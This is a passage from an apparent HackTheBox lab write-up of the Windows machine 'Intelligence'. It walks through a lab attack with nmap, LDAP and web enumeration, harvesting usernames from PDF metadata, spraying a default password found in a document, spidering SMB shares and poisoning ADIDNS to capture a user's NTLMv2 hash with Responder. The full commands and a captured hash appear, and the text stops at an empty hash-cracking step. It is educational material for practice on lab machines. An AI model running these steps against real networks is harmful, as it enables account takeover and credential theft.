---
title: "Intelligence"
date: 2024-12-30
tags: AD ADIDNS gMSA constrainedDelegation Kerberos PDFAnalysis Responder BloodHound OSCP windows HTB
toc: true
toc_label: "Intelligence"
toc_sticky: true
---

# Overview

Intelligence is a Windows Active Directory machine that showcases several interesting attack vectors and techniques:

- PDF metadata analysis for user enumeration
- ADIDNS poisoning to capture NetNTLM hashes
- gMSA (Group Managed Service Account) password abuse
- Constrained delegation exploitation
- Silver ticket generation for privilege escalation

The attack chain involves compromising a standard user account through PDF analysis, escalating to an IT support account via DNS poisoning, and finally reaching Domain Admin through service account delegation privileges.

Difficulty: Medium  
Skills Required: Active Directory fundamentals, Windows privilege escalation
Skills Learned: ADIDNS manipulation, gMSA exploitation, Kerberos delegation

# Intelligence

Intelligence was quite a fun and unique box for me. It allows exploring interesting Active Directory topics like ADIDNS poisoning, constrained delegation, and gMSA.

Through this box, I will demonstrate a neat tool to analyze PDF documents, and we will create a very simple YARA rule to search for interesting information.

# Enumeration

## Nmap

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]                                                              
└─$ nmap -sS -p- 10.10.10.248 -oN allports.nmap                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 15:27 EST                                        
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                           
SYN Stealth Scan Timing: About 0.02% done                                                                 
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                           
SYN Stealth Scan Timing: About 10.33% done; ETC: 15:30 (0:02:36 remaining)                                
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 80.91% done; ETC: 15:29 (0:00:22 remaining)                                
Nmap scan report for 10.10.10.248                                                                         
Host is up (0.030s latency).                                                                                                                                                                                         
Not shown: 65516 filtered tcp ports (no-response)                                                         
PORT      STATE SERVICE                                                                                   
53/tcp    open  domain                                                                                    
80/tcp    open  http                                                                                      
88/tcp    open  kerberos-sec                                                                              
135/tcp   open  msrpc                                                                                     
139/tcp   open  netbios-ssn                                                                               
389/tcp   open  ldap                                                                                      
445/tcp   open  microsoft-ds                                                                              
464/tcp   open  kpasswd5                                                                                  
593/tcp   open  http-rpc-epmap                                                                            
636/tcp   open  ldapssl                                                                                   
3268/tcp  open  globalcatLDAP                                                                             
3269/tcp  open  globalcatLDAPssl                                                                          
9389/tcp  open  adws                                                                                      
49666/tcp open  unknown                                                                                   
49691/tcp open  unknown                                                                                                                                                                                              
49692/tcp open  unknown                                                                                   
49711/tcp open  unknown                                                                                   
49717/tcp open  unknown                                                                                   
49740/tcp open  unknown                                                                                   
                                                                                                          
Nmap done: 1 IP address (1 host up) scanned in 108.60 seconds 
```

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]                                                              
└─$ nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49666 -sC -sV 10.10.10.248  -oN scripts.nmap              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 15:30 EST 
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                               
Service scan Timing: About 7.14% done; ETC: 15:32 (0:01:18 remaining)                              
Nmap scan report for 10.10.10.248                                                                         
Host is up (0.030s latency).                                                                              
                                                                                                          
PORT      STATE    SERVICE       VERSION                                                                                                                                                                             
53/tcp    open     domain        Simple DNS Plus                                                          
80/tcp    open     http          Microsoft IIS httpd 10.0                                          
|_http-server-header: Microsoft-IIS/10.0                                                                  
| http-methods:                                                                                           
|_  Potentially risky methods: TRACE                                                                      
|_http-title: Intelligence                                                                                                                                                                                           
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-27 03:30:51Z)           
135/tcp   open     msrpc         Microsoft Windows RPC                                             
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn                                            
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)                                                                                 
|_ssl-date: 2024-12-27T03:32:20+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb                                                       
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16                                                                   
|_Not valid after:  2022-04-19T00:43:16                                                                   
445/tcp   open     microsoft-ds?                                                                          
464/tcp   open     kpasswd5?                                                                              
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0                                      
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)                                                                                 
|_ssl-date: 2024-12-27T03:32:20+00:00; +7h00m01s from scanner time.                                       
| ssl-cert: Subject: commonName=dc.intelligence.htb                                                       
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb       
| Not valid before: 2021-04-19T00:43:16                                                                   
|_Not valid after:  2022-04-19T00:43:16                                                                   
1433/tcp  filtered ms-sql-s                                                                               
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)                                                                                 
| ssl-cert: Subject: commonName=dc.intelligence.htb                                                       
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb       
| Not valid before: 2021-04-19T00:43:16                                                                   
|_Not valid after:  2022-04-19T00:43:16                                                                   
|_ssl-date: 2024-12-27T03:32:20+00:00; +7h00m01s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb                                                       
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16                                                                   
|_Not valid after:  2022-04-19T00:43:16                                                                   
|_ssl-date: 2024-12-27T03:32:20+00:00; +7h00m01s from scanner time.
5985/tcp  filtered wsman                                                                                  
9389/tcp  open     mc-nmf        .NET Message Framing
49666/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:                                                                                      
| smb2-time:                                                                                              
|   date: 2024-12-27T03:31:44                                                                             
|_  start_date: N/A                                                                                       
| smb2-security-mode:                                                                                     
|   3:1:1:                                                                                                
|_    Message signing enabled and required                                                                
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.69 seconds

```

This appears to be an AD Windows box with LDAP, Kerberos, and a web server among others up and running. From Nmap's LDAP enumeration script, the host appears to be a domain controller with the DC name "dc.intelligence.htb".

## AD Enumeration

As I am relatively new to AD enumeration, I like to start with domain user enumeration. There are a couple of tools for that, and enum4Linux appears to be a good starting point.

### **ENUM4LINUX**

```bash
└─$ enum4linux-ng dc.intelligence.htb
ENUM4LINUX - next generation (v1.3.4)

[*] Username ......... ''
[*] Random Username .. 'wqxiurqw'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

[*] Checking SMB over NetBIOS
 ===========================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: intelligence.htb
[-] Could not get NetBIOS names information via 'nmblookup': timed out
 ================================================
 [..SNIP..]
 *] Trying on 445/tcp
  SMB 2.02: true

|    Domain Information via SMB session for dc.intelligence.htb    |
 ==================================================================
NetBIOS domain name: intelligence
DNS domain: intelligence.htb
Derived membership: domain member
Derived domain: intelligence

 ================================================
|    RPC Session Check on dc.intelligence.htb    |
 ================================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ==========================================================
|    Domain Information via RPC for dc.intelligence.htb    |
 ==========================================================
[+] Domain: intelligence
[+] Domain SID: S-1-5-21-4210132550-3389855604-3437519686
[+] Membership: domain member

 ======================================================
|    OS Information via RPC for dc.intelligence.htb    |
 ======================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

=============================================
|    Shares via RPC on dc.intelligence.htb    |
 =============================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

```

If no credentials are provided to enum4linux, it will try to perform a null authentication via RPC and enumerate interesting info like:

- Users and groups through RID cycling attack
- Password policies
- Other Windows-related info

It basically helps find low-hanging fruits automatically and consolidates them without using specific enumeration tools per service (like SMB, LDAP and Kerberos).

Unfortunately, in this case, not much info could be gleaned from enum4linux.

So far we don't have any usernames, nor the domain password policy, nor how the domain usernames are structured (e.g., john.doe or jdoe or doej or john or doe?)

What we can do is use kerbrute to brute force domain users by providing a user dictionary based on common Domain user naming conventions (firstname.lastname or firstname or lastname etc.) and from there try to brute force the passwords.

Since we also have other services like web, before falling into that brute force approach, we can move to other services and come back to that as our last resort.

Moving on to LDAP

### **LDAP**

with Zero credential we can try to see  what info we can get from LDAP through a null bind search( similar to ftp anonymous authentication)

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]                                                                                                                                                                                                                                                                                                                                                                                               
└─$ ldapsearch  -H ldap://10.10.10.248 -x -b '' -s base '*'                                                                                                                                                                                                                                                                                                                                                                                
# extended LDIF                                                                                                                                                                                                                                                                                                                                                                                                                            
#                                                                                                                                                                                                                                                                                                                                                                                                                                          
# LDAPv3                                                                                                                                                                                                                                                                                                                                                                                                                                   
# base <> with scope baseObject                                                                                                                                                                                                                                                                                                                                                                                                            
# filter: (objectclass=*)                                                                                                                                                                                                                                                                                                                                                                                                                  
# requesting: *                                                      
**[....SNIP......]
dnsHostName: dc.intelligence.htb
defaultNamingContext: DC=intelligence,DC=htb
currentTime: 20241229062313.0Z
configurationNamingContext: CN=Configuration,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1**
```

nothing much interesting beside the dc dnsHostName which we already knew from nmap scan.

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ ldapsearch  -H ldap://10.10.10.248 -x -b 'dc.intelligence.htb' -s sub '*' 
# extended LDIF
#
# LDAPv3
# base <dc.intelligence.htb> with scope subtree
# filter: (objectclass=*)
# requesting: * 
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

when tryinng to enumerate further we can't because of the lack of credentials

moving on

## Port 80

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]                                                              
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.10.10.248 -o port80_direct.gobuster                                                                        
===============================================================                                           
Gobuster v3.6                                                                                                                                                                                                        
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                             
===============================================================                                           
[+] Url:                     http://10.10.10.248                                                          
[+] Method:                  GET                                                                          
[+] Threads:                 10                                                                           
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt      
[+] Negative Status codes:   404                                                                                                                                                                                     
[+] User Agent:              gobuster/3.6                                                                 
[+] Timeout:                 10s                                                                          
===============================================================                                           
Starting gobuster in directory enumeration mode                                                           
===============================================================                                           
/documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/documents/]                      
/Documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/Documents/]                      
Progress: 220559 / 220560 (100.00%)                                                                       
===============================================================                                           
Finished                                                                                                  
===============================================================                                                                                                                                    
```

we can notice a /documents directory which server 2 documents found on the website

- Anouncement Document
    
    ```bash
    ┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
    └─$ wget http://10.10.10.248/documents/2020-01-01-upload.pdf                            
    --2024-12-28 16:33:38--  http://10.10.10.248/documents/2020-01-01-upload.pdf
    
    ┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
    └─$ exiftool 2020-01-01-upload.pdf
    ExifTool Version Number         : 13.00
    File Name                       : 2020-01-01-upload.pdf
    Directory                       : .
    File Size                       : 27 kB
    File Inode Change Date/Time     : 2024:12:26 16:41:20-05:00
    File Permissions                : -rw-rw-r--
    File Type                       : PDF
    File Type Extension             : pdf
    MIME Type                       : application/pdf
    PDF Version                     : 1.5
    Linearized                      : No
    Page Count                      : 1
    Creator                         : William.Lee
    
    ```
    
- Other Documents

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ wget http://10.10.10.248/documents/2020-12-15-upload.pdf                    
--2024-12-28 16:35:43--  http://10.10.10.248/documents/2020-12-15-upload.pdf

┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ exiftool 2020-12-15-upload.pdf                          
ExifTool Version Number         : 13.00
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2024:12:26 16:43:16-05:00
File Inode Change Date/Time     : 2024:12:26 16:42:17-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams

```

while the content of the PDFs themselves are just word fillers, the pdf metadata returns different creator names: William.Lee and Jose.Williams

and we can check if these users are valid users

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ ~/go/bin/kerbrute userenum valid_users -d intelligence.htb --dc dc.intelligence.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/28/24 - Ronnie Flathers @ropnop

2024/12/28 17:41:03 >  Using KDC(s):
2024/12/28 17:41:03 >   dc.intelligence.htb:88

2024/12/28 17:41:03 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/12/28 17:41:03 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/12/28 17:41:03 >  Done! Tested 2 usernames (2 valid) in 0.031 seconds
```

as returned by kerbrute they are indeed valid domain users.

### Fuzzing

coming back to that `/documents` folder we noticed that both downloaded files follows a very specific pattern: `YYYY-mm-dd-upload.pdf`

```bash
2020-01-01-upload.pdf
2020-12-15-upload.pdf
```

we can build a dictionary with other possible date and check if we might get lucky 

**possible file names**

```python
#!/usr/bin/python3

startYear = 2010
startMonth = 1
startDays = 1

totalFileName = []
for iyear in range(0,25):
    for imonth in range(0,13):
        for iday in range(0,31):
            totalFileName.append(f"{startYear+iyear}-{(startMonth+imonth):02}-{(startDays+iday):02}-upload.pdf")

with open("fuzzFileupload.txt", "w") as f:
    for name in totalFileName:
        f.write(name + "\n")
```

I have set a date range from 2010 to 2025, generated possible combinations and saved them in a file called "fuzzFileupload.txt".

Running wfuzz to check for any hits:

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ wfuzz -w fuzzFileupload.txt -u http://10.10.10.248/documents/FUZZ --hc 404 -f wfuzz.result
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.248/documents/FUZZ
Total requests: 10075

Total time: 0
Processed Requests: 10075
Filtered Requests: 9976
Requests/sec.: 0

                                                                       
```

It returns 99 results which means 99 potential domain users if they follow the same pattern as the documents previously retrieved.

We can download all the PDFs with a simple bash one-liner:

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ for i in $(cut -d '"' -f 2 ../wfuzz.result); do wget http://intelligence.htb/documents/$i; done;
```

After fetching all the files, we can extract the document author names using `exiftool`:

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ exiftool *.pdf | grep Creator | cut -d ":" -f 2 | cut -d " " -f 2 > domain_users
William.Lee      
Scott.Scott   
Jason.Wright
Veronica.Patel
Jennifer.Thomas

┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ cat domain_users | uniq | wc -l
99
```

We have 99 unique domain users.

### YARA Rule

We can leverage YARA and **pdf-parser** to look up specific keywords in all the 99 PDF files:

```yara
rule matchString
{
        strings:
                $matchUser = "user" nocase
                $matchPass = "pass" nocase

        condition:
                ($matchUser or $matchPass)
}
```

In this case, the YARA rule will look up for the keywords `user` or `pass` case insensitive.

We can run the command below in a for loop:

```bash
pdf-parser -y ../yaraRule.yara PDFFILE.pdf
```

```bash
                                                                                                           
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]                                                                                                                                                             
└─$ for pdfName in $(ls *.pdf); do echo $pdfName; pdf-parser -y ../yaraRule.yara $pdfName | grep -v "this version of Python" | grep -v "Should you enc"; done;

[..SNIP...]
2020-06-02-upload.pdf                                                                                                                                                                                                
2020-06-03-upload.pdf                                                                                                                                                                                                
2020-06-04-upload.pdf                                                                                                                                                                                                
YARA rule: matchString (../yaraRule.yara)                                                                                                                                                                            
obj 3 0                                                                                                                                                                                                              
 Type:                                                                                                                                                                                                               
 Referencing:                                                                                                                                                                                                        
 Contains stream                                                                                                                                                                                                     
                                                                                                          
  <<                                                                                                                                                                                                                 
    /Length 292                                                                                                                                                                                                      
    /Filter /FlateDecode                                                                                                                                                                                             
  >>                                        
  
 [..SNIP..]  
```

the file `2020-06-04-upload.pdf` appears to be containing the keyword we are looking for 

```bash
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

from there we try the default password `NewIntelligenceCorpUser9876` in all 99 users.

# Exploitation and Privilege Escalation

## User Flag - Initial Access

### Finding Valid Credentials

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ crackmapexec smb 10.10.10.248 -u domain_users -p 'NewIntelligenceCorpUser9876' --continue-on-success | grep -v "-"
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

We found a valid domain user: `Tiffany.Molina`

### SMB Shares Enumeration

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ           
```

Among the shares besides the standard default ones, we have access to the shares **Users** and **IT**.

*Spidering Users Share*

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --spider Users --regex .
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [*] Started spidering
SMB         10.10.10.248    445    DC               [*] Spidering .
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/.. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Administrator [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/All Users [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Default [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Default User [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/desktop.ini [lastm:'2021-04-18 23:15' size:174]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Public [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Ted.Graves [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina [dir]
[..SNIP..]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk [lastm:'2021-04-18 20:51' size:2494]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk [lastm:'2021-04-18 20:51' size:2494]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Templates/. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Templates/.. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/Desktop/. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/Desktop/.. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/Desktop/user.txt [lastm:'2024-12-28 22:48' size:34]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/Documents/. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/Users/Tiffany.Molina/Documents/.. [dir]
[..SNIP..]

                     
```

Looking through all the users' content, Tiffany had access to only `/Users/Default User` and `/Users/Tiffany.Molina` folders.

Besides .lnk files, we can retrieve the file `//10.10.10.248/Users/Tiffany.Molina/Desktop/user.txt` since we have access to it:

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ smbclient \\\\intelligence.htb\\Users -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
Try "help" to get a list of possible commands.
smb: \> cd Tiffany.Molina\Desktop
smb: \Tiffany.Molina\Desktop\> get user.txt 
```

*Spidering IT Share*

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --spider IT --regex .
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [*] Started spidering
SMB         10.10.10.248    445    DC               [*] Spidering .
SMB         10.10.10.248    445    DC               //10.10.10.248/IT/. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/IT/.. [dir]
SMB         10.10.10.248    445    DC               //10.10.10.248/IT/downdetector.ps1 [lastm:'2021-04-18 20:50' size:1046]
SMB         10.10.10.248    445    DC               [*] Done spidering (Completed in 0.19669747352600098)
                                                                                                                   
```

There is only one file named `downdetector.ps1`:

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ smbclient \\\\intelligence.htb\\IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
Try "help" to get a list of possible commands.
smb: \> get downdetector.ps1 
```

**downdetector.ps1** content:

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

The script appears to be querying DNS records of the domain "intelligence.htb" and looking for subdomains that start with "web.*"

For example, the path might look like below:
`AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb`

```text
AD: Refers to the Active Directory drive in PowerShell
DC=intelligence.htb: Represents the DNS zone being queried (a fully qualified domain name)
CN=MicrosoftDNS: Specifies the container for DNS records in AD
DC=DomainDnsZones: Indicates a partition where DNS-related objects are stored in AD
DC=intelligence,DC=htb: Represents the AD domain name (intelligence.htb)
```

After finding subdomains starting with "web", it will make an authenticated web request to check if that host is alive. If not, an email is sent to Ted Graves with the hostname.

In our case, since the device is using authenticated web requests, we might be able to capture the NetNTLM hashes of whoever executes this script.

To do that, we need to create a fake DNS record containing "web" in the subdomain name. We can do this using Tiffany's credentials and hope that the PowerShell script is executed by some sort of scheduled task.

After some research, I found a blog that mentions such a technique called [ADIDNS Poisoning](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing).

In the example, they are using a tool from this [GIT KRBRELAY](https://github.com/dirkjanm/krbrelayx/tree/master).

Example DNS query:

```bash
┌──(kali㉿kali)-[/opt/krbrelayx]                                                                          
└─$ python3 dnstool.py -u 'INTELLIGENCE\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --zone 'intelligence.htb' --record '@' --action 'query'  intelligence.htb  
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record @
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 28 (Unsupported) (Serial: 71)
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 28 (Unsupported) (Serial: 71)
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 6 (SOA) (Serial: 71)
 - Serial: 70
 - Refresh: 900
 - Retry: 600
 - Expire: 86400
 - Minimum TTL: 3600
 - Primary server: dc.intelligence.htb.
 - Zone admin email: hostmaster.intelligence.htb.
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 2 (NS) (Serial: 71)
 - Address: dc.intelligence.htb.
DC=@,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 71)
 - Address: 10.10.10.248

```

This returns interesting info regarding the current AD DNS server like the DNS zone update refresh interval (600s ⇒ 15min) and more that we won't need here.

## From Tiffany.Molina to Ted.Graves

### Creating a Fake DNS Record

```bash
┌──(kali㉿kali)-[/opt/krbrelayx]                                                                          
└─$ python3 dnstool.py -u 'INTELLIGENCE\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --record webHijack.intelligence.htb --action add --data 10.10.14.18  dc.intelligence.htb -dns-ip 10.10.10.248               
[-] Connecting to host...                                                                                 
[-] Binding to host                                                                                       
[+] Bind OK                                                                                               
[-] Adding new record                                                                                     
[+] LDAP operation completed successfully
```

With dnstool we create a DNS record titled `webHijack.intelligence.htb` and point it to our attacking box IP `10.10.14.18`. Finally, for DNS domain resolution we use `-dns-ip 10.10.10.248`.

From there we can set up **responder** in passive mode to intercept the NetNTLM hash thanks to the authenticated HTTP request:

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]                                                                                                                                                            
└─$ sudo responder -I tun0 -A                                                                             
[sudo] password for kali:                                                                                 
                                         __                                                                                                                                                                          
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                                                                                                                                                                                                                                                                                                   
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                                                                             
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                                                               
                   |__|                                                                                   
                                                                                                          
           NBT-NS, LLMNR & MDNS Responder 3.1.5.0            
           
[HTTP] NTLMv2 Client   : 10.10.10.248                                                                     
[HTTP] NTLMv2 Username : intelligence\Ted.Graves                                                          
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:09b62d495591053e:7BCE0FB584FFD6B6C583D6E2E9222BCB:010100000000000012F5A63F6C5ADB01F0A4AFA24B678B29000000000200080033004B003600450001001E00570049004E002D00580053004500340052004E005600570049004D0059000400140033004B00360045002E004C004F00430041004C0003003400570049004E002D00580053004500340052004E005600570049004D0059002E0033004B00360045002E004C004F00430041004C000500140033004B00360045002E004C004F00430041004C00080030003000000000000000000000000020000078544E69ABB2F2ADA186EFB39622343B9CC325FFC0475B66641F82CA5F7627330A0010000000000000000000000000000000000009003E0048005400540050002F00770065006200680069006A00610063006B002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

### **Cracking Ted's hash**

```bash
